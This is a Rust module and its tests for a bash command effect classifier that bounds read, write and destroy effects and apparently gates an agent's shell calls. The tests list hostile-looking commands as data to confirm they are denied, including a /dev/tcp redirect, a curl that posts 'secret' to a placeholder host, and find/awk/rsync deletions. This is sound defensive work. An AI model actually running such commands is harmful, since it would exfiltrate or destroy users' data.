//! Code-owned effect bounds. Syntax composition is independent of CLI semantics.
//! This is evidence, not execution authority: scope and workflow capabilities
//! remain separate gates. No payload/source text is serialized by this module.
use crate::{bash_classifier, shell_redirect};
use serde::Serialize;
use sha2::{Digest, Sha256};
use tree_sitter::{Node, Parser};

pub use crate::resource_effects::{Compatibility, ALL, DESTROY, READ, WRITE};
use crate::resource_effects::{EffectBounds, EffectSet};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Location {
    Local,
    External,
    Unknown,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Component {
    pub start_byte: usize,
    pub end_byte: usize,
    pub kind: &'static str,
    pub lower: u8,
    pub upper: u8,
    pub location: Location,
    pub complete: bool,
    pub reason: &'static str,
    pub required_capabilities: Vec<&'static str>,
    pub provenance: &'static str,
}

#[derive(Clone, PartialEq, Eq, Serialize)]
pub struct Evidence {
    pub schema: &'static str,
    #[serde(skip)]
    pub source_sha256: Option<String>,
    pub syntax_valid: bool,
    pub lower: u8,
    pub upper: u8,
    pub complete: bool,
    pub components: Vec<Component>,
    pub invocations: Vec<crate::invocation_evidence::InvocationEvidence>,
}

impl std::fmt::Debug for Evidence {
    fn fmt(&self, out: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        out.debug_struct("Evidence")
            .field("schema", &self.schema)
            .field("syntax_valid", &self.syntax_valid)
            .field("lower", &self.lower)
            .field("upper", &self.upper)
            .field("complete", &self.complete)
            .field("components", &self.components)
            .field("invocations", &self.invocations)
            .finish()
    }
}

impl Evidence {
    /// Missing utility semantics can use a legacy behavior adapter, but lost
    /// shell/context grammar may not disappear through that fallback.
    pub(crate) fn has_structural_loss(&self) -> bool {
        !self.syntax_valid || self.components.iter().any(|part| {
            !part.complete && part.reason != "leaf_effect_evidence_missing"
        })
    }
    /// Bounded provider metadata; literal argv and its local source digest
    /// stay outside this projection. Full evidence remains in the local IR.
    pub fn semantic_projection(&self) -> serde_json::Value {
        serde_json::json!({"schema":self.schema,"syntax_valid":self.syntax_valid,
            "behavior_complete":self.complete,"effect_lower":self.lower,"effect_upper":self.upper,
            "component_count":self.components.len(),"invocation_count":self.invocations.len(),
            "complete_argv_invocations":self.invocations.iter().filter(|call|call.argv_complete).count(),
            "missing_behavior_components":self.components.iter().filter(|part|!part.complete).count()})
    }
    /// Effect-only subset check. Compatible never grants scope/capability or
    /// missing provenance, even when all three effects are permitted.
    pub fn compatibility(&self, allowed: u8) -> Compatibility {
        if !self.syntax_valid {
            return Compatibility::Unresolved;
        }
        let (Ok(lower), Ok(upper), Ok(allowed)) = (
            EffectSet::try_from(self.lower),
            EffectSet::try_from(self.upper),
            EffectSet::try_from(allowed),
        ) else {
            return Compatibility::Unresolved;
        };
        EffectBounds::new(lower, upper).map_or(Compatibility::Unresolved, |bounds| {
            bounds.compatibility(allowed)
        })
    }
    pub fn proven_read(&self) -> bool {
        self.syntax_valid && self.complete && !self.components.is_empty() && self.upper & !READ == 0
    }
    fn push(&mut self, component: Component) {
        self.lower |= component.lower;
        self.upper |= component.upper;
        self.complete &= component.complete;
        self.components.push(component);
    }
}

fn component(
    node: Node<'_>,
    kind: &'static str,
    lower: u8,
    upper: u8,
    location: Location,
    complete: bool,
    reason: &'static str,
) -> Component {
    Component {
        start_byte: node.start_byte(),
        end_byte: node.end_byte(),
        kind,
        lower,
        upper,
        location,
        complete,
        reason,
        required_capabilities: Vec::new(),
        provenance: "native_bash_ast_and_strict_leaf_proof_v1",
    }
}

fn unknown(node: Node<'_>, reason: &'static str) -> Component {
    component(node, "unresolved", 0, ALL, Location::Unknown, false, reason)
}

// Existing utility semantics are an adapter, not the composition core. In
// particular, do not map legacy FileWrite/Destructive labels into exact bits.
fn command_leaf(node: Node<'_>, source: &str) -> Component {
    let Ok(text) = node.utf8_text(source.as_bytes()) else {
        return unknown(node, "source_unavailable");
    };
    let Some(capabilities) = bash_classifier::readonly_capabilities(text) else {
        let invocation = crate::invocation_evidence::InvocationEvidence::capture(node, source);
        if invocation.assignments.is_empty() && !invocation.assignments_truncated
            && !invocation.arguments_truncated
        {
            let ceiling = invocation.executable.as_ref()
                .and_then(|executable| executable.literal())
                .and_then(|executable| {
                    crate::utility_effects::invariant_ceiling(executable).or_else(|| {
                        if !invocation.argv_complete { return None; }
                        let arguments = invocation.arguments.iter()
                            .map(|argument| argument.literal()).collect::<Option<Vec<_>>>()?;
                        crate::utility_effects::literal_ceiling(executable, &arguments)
                    })
                });
            if let Some(ceiling) = ceiling {
                let mut result = component(node, "command", 0, ceiling.upper,
                    Location::Local, true, ceiling.contract);
                if ceiling.upper & READ != 0 { result.required_capabilities.push("Read"); }
                if ceiling.upper & WRITE != 0 { result.required_capabilities.push("Write"); }
                return result;
            }
        }
        return unknown(node, "leaf_effect_evidence_missing");
    };
    let external = bash_classifier::classify(text).contains(&bash_classifier::OpClass::RemoteRead);
    let mut result = component(
        node,
        "command",
        0,
        READ,
        if external {
            Location::External
        } else {
            Location::Local
        },
        true,
        "strict_leaf_read_upper_bound",
    );
    result.required_capabilities = capabilities;
    result
}

/// Parse locally without executing commands, reading program files, changing
/// runtime flags or requesting model inference. Unknown coverage survives union.
pub fn assess(source: &str) -> Evidence {
    let mut out = Evidence {
        schema: "statewright/effect-evidence/v2",
        source_sha256: None,
        syntax_valid: false,
        lower: 0,
        upper: ALL,
        complete: false,
        components: Vec::new(),
        invocations: Vec::new(),
    };
    if source.len() > 256 * 1024 {
        return out;
    }
    out.source_sha256 = Some(format!("{:x}", Sha256::digest(source.as_bytes())));
    let mut parser = Parser::new();
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return out;
    }
    let Some(tree) = parser.parse(source, None) else {
        return out;
    };
    if tree.root_node().has_error() {
        return out;
    }
    out.syntax_valid = true;
    out.upper = 0;
    out.complete = true;
    walk(tree.root_node(), source, 0, &mut out);
    out
}

/// Argument values produced by the shell are not literal argv. This fact must
/// survive a known outer write operation; e.g. an expansion may supply flags.
pub(crate) fn has_argument_expansion(source: &str) -> bool {
    if source.len() > 256 * 1024 {
        return true;
    }
    let mut parser = Parser::new();
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return true;
    }
    let Some(tree) = parser.parse(source, None) else {
        return true;
    };
    fn visit(node: Node<'_>, source: &str, depth: usize) -> bool {
        if depth > 32 {
            return true;
        }
        if matches!(
            node.kind(),
            "simple_expansion"
                | "expansion"
                | "command_substitution"
                | "process_substitution"
                | "arithmetic_expansion"
                | "brace_expression"
        ) {
            return true;
        }
        // Bash expands unquoted pathname patterns before invoking a program.
        // A resulting filename can be an option, not merely an operand. Quoted
        // strings have different AST kinds; escaped metacharacters stay literal.
        if node.kind() == "word" {
            let Ok(word) = node.utf8_text(source.as_bytes()) else {
                return true;
            };
            if word.starts_with('~') || word.contains(":~") {
                return true;
            }
            let mut escaped = false;
            for ch in word.chars() {
                if escaped {
                    escaped = false;
                } else if ch == '\\' {
                    escaped = true;
                } else if matches!(ch, '*' | '?' | '[' | '{' | '}') {
                    return true;
                }
            }
        }
        let mut cursor = node.walk();
        node.named_children(&mut cursor)
            .any(|child| visit(child, source, depth + 1))
    }
    tree.root_node().has_error() || visit(tree.root_node(), source, 0)
}

fn walk(node: Node<'_>, source: &str, depth: usize, out: &mut Evidence) {
    if depth > 32 || out.components.len() >= 63 {
        // Keep bounds conservative without accumulating an unbounded AST list.
        // Reserve one slot so a legacy fallback also observes the coverage loss.
        if out.components.len() < 64 {
            out.push(unknown(node,"effect_ast_limit_exceeded"));
        }
        out.upper = ALL;
        out.complete = false;
        return;
    }
    match node.kind() {
        "command" => {
            out.invocations
                .push(crate::invocation_evidence::InvocationEvidence::capture(
                    node, source,
                ));
            out.push(command_leaf(node, source));
        }
        "file_redirect" => {
            use shell_redirect::Effect;
            let effect = shell_redirect::effect(node, source.as_bytes());
            let text = node.utf8_text(source.as_bytes()).unwrap_or("");
            // Dynamic path targets and shell network pseudo-devices do not
            // establish local-resource authority from a redirection operator.
            let dynamic = text.contains(['$', '`'])
                || text.contains("/dev/tcp/")
                || text.contains("/dev/udp/");
            let mut item = match (effect, dynamic) {
                (Effect::Discard | Effect::Descriptor, false) => component(
                    node,
                    "redirect",
                    0,
                    0,
                    Location::Local,
                    true,
                    "descriptor_or_null_sink",
                ),
                (Effect::Read, false) => component(
                    node,
                    "redirect",
                    READ,
                    READ,
                    Location::Local,
                    true,
                    "file_input_redirect",
                ),
                (Effect::Write, false) => component(
                    node,
                    "redirect",
                    WRITE,
                    WRITE,
                    Location::Local,
                    true,
                    "file_output_redirect",
                ),
                _ => unknown(node, "redirect_target_or_semantics_unresolved"),
            };
            if item.lower & WRITE != 0 {
                item.required_capabilities.push("Write");
            }
            if item.lower & READ != 0 {
                item.required_capabilities.push("Read");
            }
            out.push(item);
        }
        // Bodies/arguments may contain executable substitutions. Never skip
        // them merely because the outer command has a familiar name.
        "function_definition" => {
            out.push(unknown(node, "function_binding_unresolved"));
            return;
        }
        "variable_assignment" => out.push(unknown(node, "shell_environment_change")),
        "simple_expansion" => {
            // Parameter bytes are data, not executable code. An unquoted value
            // can subsequently glob and observe filesystem metadata; retain a
            // Read upper bound even for an otherwise output-only utility.
            out.push(component(node, "argument_expansion", 0, READ, Location::Local,
                true, "simple_parameter_data_ceiling/v1"));
        }
        "word" if node.utf8_text(source.as_bytes()).is_ok_and(has_argument_expansion) => {
            out.push(component(node, "argument_expansion", 0, READ, Location::Local,
                true, "pathname_expansion_read_ceiling/v1"));
        }
        "heredoc_redirect" | "herestring_redirect" => {
            out.push(unknown(node, "delegated_or_data_body_unresolved"))
        }
        // Explicit transparent composition and argument-data nodes only.
        // Unsupported executable/evaluation grammar must never inherit a
        // neighbor's proof by falling through a default no-op.
        "program"
        | "list"
        | "pipeline"
        | "redirected_statement"
        | "subshell"
        | "command_substitution"
        | "process_substitution"
        | "command_name"
        | "word"
        | "number"
        | "file_descriptor"
        | "raw_string"
        | "string"
        | "string_content"
        | "variable_name"
        | "special_variable_name"
        | "concatenation"
        | "comment" => {}
        _ => out.push(unknown(node, "unsupported_ast_component")),
    }
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        walk(child, source, depth + 1, out);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn bounded_stream_contracts_compose_without_erasing_children_or_context() {
        for command in ["grep -E '(one|two)' input | sed 's/old/new/g' | diff -u expected -",
            "sed ':a;N;$!ba;s/\\n/ /g' input", "cat input | sed '1,20d'", "diff --label before -u old new"] {
            let proof = assess(command);
            assert!(proof.proven_read(), "{command}: {proof:?}");
        }
        for command in ["sort -u -t, -k1,1 input", "sort -o output input | sed 's/x/y/'"] {
            let proof = assess(command);
            assert!(proof.complete, "{command}: {proof:?}");
            assert_eq!(proof.upper, READ | WRITE, "{command}");
            assert_eq!(proof.compatibility(READ), Compatibility::Unresolved, "{command}");
        }
        for command in ["sort $FLAGS input", "sort --compress-program=widget input",
            "sort -u $(widget)", "sed \"$PROGRAM\" input", "sed -f program.sed input",
            "sed 's/x/y/e' input", "sed 's/x/y/w output' input", "diff --paginate old new",
            "PATH=/tmp sed p input", "sed p input; widget", "grep pattern <(widget)",
            "sed p <(rm input)", "sort -o \"$TARGET\" input", "sed 'p' >\"$TARGET\""] {
            let proof = assess(command);
            assert!(!proof.complete, "{command}: {proof:?}");
        }
    }
    #[test]
    fn structural_loss_is_distinct_from_missing_utility_semantics_and_survives_limits() {
        assert!(!assess("widget --inspect").has_structural_loss());
        for command in ["PATH=/fixture/bin; cat fixture","unset PATH; cat fixture","cat 'broken"] {
            assert!(assess(command).has_structural_loss(),"{command}");
        }
        let proof=assess(&format!("{}PATH=/fixture/bin; cat fixture","cat fixture;".repeat(100)));
        assert!(proof.has_structural_loss());assert!(!proof.complete);
        assert!(proof.components.len()<=64);
        assert!(proof.components.iter().any(|part|part.reason=="effect_ast_limit_exceeded"));
    }
    #[test]
    fn invariant_ceiling_composes_expanded_data_without_fabricating_argv() {
        for command in ["cat $FLAGS", "cat $(cat fixture)", "dirname `pwd -P`", "echo $0", "md5sum *.txt"] {
            let proof = assess(command);
            assert!(proof.proven_read(), "{command}: {proof:?}");
            assert!(proof.invocations.iter().any(|call|!call.argv_complete), "{command}");
        }
        for command in ["touch \"$FILE\"", "chmod 644 img/*", "chown $(cat owner) destination", "tee output", "mkdir -p \"$DEST\" && cat $INPUT"] {
            let proof = assess(command);
            assert!(proof.complete, "{command}: {proof:?}");
            assert_eq!(proof.compatibility(READ|WRITE), Compatibility::Compatible, "{command}");
            assert_eq!(proof.compatibility(READ), Compatibility::Unresolved, "{command}");
        }
    }
    #[test]
    fn invariant_ceiling_never_erases_execution_context_or_unknown_children() {
        for command in ["cat $(widget)", "cat <(rm fixture)", "tee $(rm fixture)", "echo ${PATH:=/tmp}", "echo $((a[0]))", "PATH=/tmp cat fixture", "/tmp/cat fixture", "mycat fixture", "cat fixture; widget", "sort --compress-program=widget fixture", "awk '{system(\"rm fixture\")}'", "find . -exec rm '{}' ';'", "cat >\"$DEST\"", "cat >/dev/tcp/host/80"] {
            let proof = assess(command);
            assert!(!proof.complete, "{command}: {proof:?}");
            assert!(!proof.proven_read(), "{command}");
        }
    }
    #[test]
    fn shell_operand_expansion_keeps_read_ceiling_even_for_pure_transformers() {
        for command in ["echo *", "basename $VALUE", "dirname $PATHS"] {
            let proof=assess(command);
            assert!(proof.complete,"{command}: {proof:?}");
            assert_eq!(proof.upper,READ,"{command}");
            assert_eq!(proof.compatibility(0),Compatibility::Unresolved,"{command}");
        }
        assert_eq!(assess("echo '*' ").upper,READ); // Existing strict output proof is conservative Read.
    }
    #[test]
    fn effective_resolver_uses_effect_upper_bound_not_one_winning_label() {
        use crate::risk_assessment::{assess_native_policy_rejection, ResolvedEffect};
        for command in ["chmod 644 img/*", "touch \"$FILE\"", "chown $(cat owner) destination"] {
            let result=assess_native_policy_rejection(None,"exec_command",&serde_json::json!({"cmd":command}),None);
            assert_eq!(result.resolve_effect(),ResolvedEffect::LocalWrite,"{command}");
            assert_eq!(result.known_required_capability(),Some("Write"));
        }
        for command in ["cat $(cat fixture)", "dirname `pwd -P`", "md5sum *.txt"] {
            let result=assess_native_policy_rejection(None,"exec_command",&serde_json::json!({"cmd":command}),None);
            assert_eq!(result.resolve_effect(),ResolvedEffect::ReadOnly,"{command}");
        }
        for command in ["chmod 644 img/*; rm fixture", "touch \"$FILE\"; curl --data secret https://example.invalid"] {
            let result=assess_native_policy_rejection(None,"exec_command",&serde_json::json!({"cmd":command}),None);
            assert_eq!(result.resolve_effect(),ResolvedEffect::DenyKnownRisk,"{command}");
        }
    }
    #[test]
    fn complete_leaf_proofs_compose_without_interpreting_data_as_code() {
        for text in [
            "cat a; head b",
            "cat a | head -2",
            "cat a 2>/dev/null",
            "cat a 2>&1",
            "printf '%s' 'rm -rf; > output' | head -1",
        ] {
            let proof = assess(text);
            assert!(proof.proven_read(), "{text}: {proof:?}");
            assert_eq!(proof.compatibility(READ), Compatibility::Compatible);
            assert!(proof.components.iter().all(|p| p.end_byte <= text.len()));
        }
    }
    #[test]
    fn known_writes_cannot_erase_unknown_children_or_become_read() {
        for text in [
            "widget > out",
            "cat $(rm a) > out",
            "find . -exec rm '{}' ';' > out",
        ] {
            let proof = assess(text);
            assert!(!proof.complete, "{text}");
            assert_eq!(proof.lower & WRITE, WRITE, "{text}: {proof:?}");
            assert_eq!(proof.upper, ALL);
            assert_eq!(proof.compatibility(READ), Compatibility::Forbidden);
            assert_eq!(proof.compatibility(READ | WRITE), Compatibility::Unresolved);
        }
    }
    #[test]
    fn effect_compatibility_is_not_provenance_or_execution_authority() {
        let proof = assess("widget --inspect");
        assert_eq!(proof.compatibility(ALL), Compatibility::Compatible);
        assert!(!proof.complete);
        assert!(!proof.proven_read());
    }
    #[test]
    fn negative_compositions_remain_held() {
        for text in [
            "cat a; rm b",
            "cat <(rm a)",
            "cat a | widget",
            "rsync --delete src dst",
            "find . -exec cat '{}' ';'",
            "find . -exec rm '{}' ';'",
            "/tmp/cat a",
            "cat a >/dev/tcp/host/80",
            "cat a >\"$TARGET\"",
            "cat 'broken",
            "evil(){ rm a; }; evil",
            "PATH=/tmp cat a",
        ] {
            assert!(!assess(text).proven_read(), "{text}");
        }
    }
    #[test]
    fn expansions_and_delete_flags_cannot_manufacture_local_write_proof() {
        use crate::risk_assessment::{assess_native_policy_rejection, ResolvedEffect};
        for text in [
            "rsync $OPTS $SOURCE $DEST",
            "cp $OPTS source dest",
            "sed -i \"$PROGRAM\" file",
            "rsync * destination",
            "rsync [ab]* destination; cat fixture",
            "cp ? destination",
        ] {
            let result = assess_native_policy_rejection(
                None,
                "exec_command",
                &serde_json::json!({"cmd":text}),
                None,
            );
            assert_eq!(
                result.resolve_effect(),
                ResolvedEffect::DenyUncertain,
                "{text}"
            );
        }
        for text in [
            "rsync --delete src dst",
            "rsync --remove-source-files src dst",
            "rsync --delete src dst > log",
            "rsync --remove-source-files src dst 2>&1",
            "rsync --exclude '' --delete src dst",
            "rsync --exclude \"\" --delete src dst > log",
            "rsync --exclude '2'>log --delete src dst",
        ] {
            let result = assess_native_policy_rejection(
                None,
                "exec_command",
                &serde_json::json!({"cmd":text}),
                None,
            );
            assert_eq!(
                result.resolve_effect(),
                ResolvedEffect::DenyKnownRisk,
                "{text}"
            );
        }
        assert!(!has_argument_expansion("printf '%s' '$DATA'"));
        assert!(has_argument_expansion("printf '%s' \"$DATA\""));
        assert!(!has_argument_expansion("rsync '*' destination"));
        assert!(!has_argument_expansion(r"rsync \* destination"));
        assert_eq!(
            crate::bash_classifier::simple_command_tokens("utility '' \"\" a''b"),
            Some(vec!["utility".into(), "".into(), "".into(), "ab".into()])
        );
        for text in [
            "rsync -e'custom-shell' src host:dst",
            "rsync -avecustom-shell src host:dst",
            "rsync --rsh=custom-shell src host:dst",
            "rsync --rsync-pa=custom-shell src host:dst",
            "rsync --unknown src dst",
            "rsync --files-from=host:/list src dst",
            "rsync -e'custom-shell' src host:dst > log",
            "rsync -avecustom-shell src host:dst > log",
            "rsync --unknown src dst > log",
        ] {
            let result = assess_native_policy_rejection(
                None,
                "exec_command",
                &serde_json::json!({"cmd":text}),
                None,
            );
            assert!(
                !matches!(
                    result.resolve_effect(),
                    ResolvedEffect::ReadOnly | ResolvedEffect::LocalWrite
                ),
                "{text}"
            );
        }
        for text in [
            "rsync --exclude --delete src dst",
            "rsync -- src --delete",
            "rsync '*' destination",
            r"rsync \* destination",
        ] {
            let result = assess_native_policy_rejection(
                None,
                "exec_command",
                &serde_json::json!({"cmd":text}),
                None,
            );
            assert_eq!(
                result.resolve_effect(),
                ResolvedEffect::LocalWrite,
                "{text}"
            );
        }
    }
    #[test]
    fn unsupported_evaluation_cannot_inherit_a_neighbors_read_proof() {
        for text in [
            "unset NAME; cat fixture",
            "declare value=expression; cat fixture",
            "((x=1)); cat fixture",
            "((arr[index]++)); cat fixture",
            "[[ $DATA ]]; cat fixture",
        ] {
            assert!(!assess(text).complete, "{text}");
            assert!(!assess(text).proven_read(), "{text}");
        }
    }
    #[test]
    fn file_outputs_are_write_bounds_and_locations_do_not_confer_scope() {
        let proof = assess("cat input > output");
        assert!(proof.complete);
        assert_eq!(proof.lower, WRITE);
        assert_eq!(proof.upper, READ | WRITE);
        assert_eq!(proof.compatibility(READ | WRITE), Compatibility::Compatible);
        assert_eq!(proof.compatibility(READ), Compatibility::Forbidden);
        let remote = assess("kubectl -n fixture get pods");
        assert!(remote.proven_read());
        assert!(remote
            .components
            .iter()
            .any(|p| p.location == Location::External));
    }
}
